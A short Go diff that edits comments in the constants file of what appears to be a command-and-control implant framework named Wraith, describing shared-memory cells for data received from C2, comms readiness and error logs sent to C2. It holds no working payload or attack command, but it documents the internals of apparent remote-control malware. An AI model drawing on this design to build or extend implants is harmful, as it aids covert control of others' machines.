@@ -11,9 +11,9 @@ const (
 
 	// This cell stores all data which has been received from C2 and is
 	// awaiting processing. This data should be managed and directed to
-	// individual comms modules by the MOD_COMMS_MANAGER module. Hence,
-	// only that module should really read from this cell, but any module
-	// can write to it.
+	// individual modules by the MOD_COMMS_MANAGER module. Hence, only
+	// that module should really read from this cell, and only modules
+	// responsible for receiving of data should write to it.
 	SHM_RX_QUEUE = "rxQueue"
 
 	// This cell holds the status of the CommsManager. Modules should not
@@ -21,6 +21,8 @@ const (
 	// their messages can get lost.
 	SHM_COMMS_READY = "commsReady"
 
+	// This cell holds the latest error which occurred, be it in a module
+	// or Wraith itself. Can be used to send error logs to C2.
 	SHM_ERRS = "err"
 )
 
